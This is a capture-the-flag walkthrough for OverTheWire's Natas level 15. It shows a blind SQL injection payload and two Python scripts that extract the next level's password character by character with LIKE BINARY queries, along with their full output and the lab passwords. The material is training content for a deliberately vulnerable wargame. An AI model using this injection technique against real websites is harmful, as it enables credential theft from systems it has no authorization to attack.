`Link` : `https://overthewire.org/wargames/natas/natas15.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟒 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟓
## 𝐆𝐢𝐯𝐞𝐧
- Username: natas15
- URL:      `http://natas15.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit:      `http://natas15.natas.labs.overthewire.org`
- Notice username field
- Try `"`, we get `error in query`
- Possiblity of blind SQL injection
- Let's check if `natas16` exists? It exists
- `natas16" and "" "` - works perfectly as a payload
- From source code we noticed that there are two columns in a table - `username` & `password`
- we have to retrieve `password`
- `SQL Like` operator can be used for that. More about it here:
  - `https://www.w3schools.com/sql/sql_like.asp`
  -  `LIKE` is non case sensitive
  -  `LIKE Binary` is case sensitive

- Let's check password is made of which characters:

```
# brute forcing password of natas 15

import requests
from requests.auth import HTTPBasicAuth

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

user_exists = "This user exists."
char_exists = ""




for char in characters:
    url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16" and password like binary' + "'%" + char + "%'" + '"' 
    response = requests.get(url, auth= (username, password) )
    print("checked: ", char)
    if user_exists in response.text:
        char_exists += char
        
print("character exists ", char_exists)

```
```
┌──(shreyas㉿kali)-[~/scripts]
└─$ python3 existing-chars-natas15.py
checked:  a
checked:  b
checked:  c
checked:  d
checked:  e
checked:  f
checked:  g
checked:  h
checked:  i
checked:  j
checked:  k
checked:  l
checked:  m
checked:  n
checked:  o
checked:  p
checked:  q
checked:  r
checked:  s
checked:  t
checked:  u
checked:  v
checked:  w
checked:  x
checked:  y
checked:  z
checked:  A
checked:  B
checked:  C
checked:  D
checked:  E
checked:  F
checked:  G
checked:  H
checked:  I
checked:  J
checked:  K
checked:  L
checked:  M
checked:  N
checked:  O
checked:  P
checked:  Q
checked:  R
checked:  S
checked:  T
checked:  U
checked:  V
checked:  W
checked:  X
checked:  Y
checked:  Z
checked:  0
checked:  1
checked:  2
checked:  3
checked:  4
checked:  5
checked:  6
checked:  7
checked:  8
checked:  9
character exists  acehijmnpqtwBEHINORW03569
```

- Brute Forcing the password:
```
import requests

character_container = "acehijmnpqtwBEHINORW03569"
print(f"Character container: {character_container}")

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

user_exists = "This user exists."
natas16_password = ""

remaining = 32 - len(natas16_password)
while remaining:
    for char in character_container:
        url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16" and password like binary' + "'" + natas16_password + char + "%'" + '"'
        response = requests.get(url, auth= (username, password))
        if user_exists in response.text:
            natas16_password += char
            remaining = 32 - len(natas16_password)
    print(f"remaining length: {remaining} & password: {natas16_password}")




```
```
┌──(shreyas㉿kali)-[~]
└─$ python3 brute-forcing-natas15.py
Character container: acehijmnpqtwBEHINORW03569
remaining length: 31 & password: W
remaining length: 29 & password: WaI
remaining length: 28 & password: WaIH
remaining length: 27 & password: WaIHE
remaining length: 23 & password: WaIHEacj6
remaining length: 22 & password: WaIHEacj63
remaining length: 21 & password: WaIHEacj63w
remaining length: 19 & password: WaIHEacj63wnN
remaining length: 18 & password: WaIHEacj63wnNI
remaining length: 16 & password: WaIHEacj63wnNIBR
remaining length: 15 & password: WaIHEacj63wnNIBRO
remaining length: 14 & password: WaIHEacj63wnNIBROH
remaining length: 12 & password: WaIHEacj63wnNIBROHeq
remaining length: 10 & password: WaIHEacj63wnNIBROHeqi3
remaining length: 8 & password: WaIHEacj63wnNIBROHeqi3p9
remaining length: 6 & password: WaIHEacj63wnNIBROHeqi3p9t0
remaining length: 4 & password: WaIHEacj63wnNIBROHeqi3p9t0m5
remaining length: 3 & password: WaIHEacj63wnNIBROHeqi3p9t0m5n
remaining length: 1 & password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
remaining length: 0 & password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

```
- `remaining length: 0 & password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`


---

## 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠
- SQL Like: 
  - `https://www.w3schools.com/sql/sql_like.asp`
  - `https://www.youtube.com/watch?v=ZABT_3t4Iew`
- Web scraping using python: `https://www.youtube.com/watch?v=uufDGjTuq34`
- Authenticating using python requests: `https://www.geeksforgeeks.org/authentication-using-python-requests/`
- Python Request module: `https://www.w3schools.com/python/module_requests.asp`
- Cut paste in vim: `https://linuxize.com/post/how-to-copy-cut-paste-in-vim/`
